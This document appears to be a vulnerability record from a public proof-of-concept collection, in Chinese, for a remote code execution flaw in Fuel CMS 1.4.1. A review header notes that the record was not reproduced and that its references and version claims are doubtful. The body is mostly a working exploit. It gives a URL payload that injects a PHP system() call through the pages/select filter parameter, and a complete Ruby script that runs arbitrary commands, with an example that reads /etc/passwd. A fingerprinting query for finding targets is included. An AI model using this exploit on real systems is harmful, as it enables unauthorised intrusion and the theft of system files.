---
source: "Threekiii/Awesome-POC"
product: "Fuel CMS1.4.1"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Fuel CMS 1.4.1 远程代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：fuel/pages/select filter入口可达；PHP system可调用；Ruby HTTPClient/docopt"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-6842ee8e2598450f2fab30a0"
entity_id: "ve-6842ee8e2598450f2fab30a0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：fuel/pages/select filter入口可达；PHP system可调用；Ruby HTTPClient/docopt

- **证据待核（1）**：漏洞描述只有参考链接，nahi/httpclient issue仅脚本库Max-Age问题不是漏洞来源。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（2）**：标题1.4.1而脚本help1.4，影响范围与鉴权未交代；缺CVE映射。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（3）**：短PoC保留Ruby插值#{cmd}并非字面请求；脚本未编码任意命令，正则无匹配会异常。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Fuel CMS 1.4.1 远程代码执行漏洞

## 漏洞描述

参考链接：

* https://github.com/nahi/httpclient/issues/242
* https://www.exploit-db.com/exploits/49487

## 网络测绘

```
"Fuel CMS"
```

## 漏洞复现

poc：

```
/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'
```

```
#!/usr/bin/env ruby

require 'httpclient'
require 'docopt'

# dirty workaround to ignore Max-Age
# https://github.com/nahi/httpclient/issues/242#issuecomment-69013932
$VERBOSE = nil

doc = <<~DOCOPT
  Fuel CMS 1.4 - Remote Code Execution

  Usage:
    #{__FILE__} <url> <cmd>
    #{__FILE__} -h | --help

  Options:
    <url>         Root URL (base path) including HTTP scheme, port and root folder
    <cmd>         The system command to execute
    -h, --help    Show this screen

  Examples:
    #{__FILE__} http://example.org id
    #{__FILE__} https://example.org:8443/fuelcms 'cat /etc/passwd'
DOCOPT

def exploit(client, root_url, cmd)
  url = root_url + "/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'"

  res = client.get(url)

  /system(.+?)<div/mx.match(res.body).captures[0].chomp
end

begin
  args = Docopt.docopt(doc)
  clnt = HTTPClient.new
  puts exploit(clnt, args['<url>'], args['<cmd>'])
rescue Docopt::Exit => e
  puts e.message
end
```


---

> 来源：Threekiii/Awesome-POC
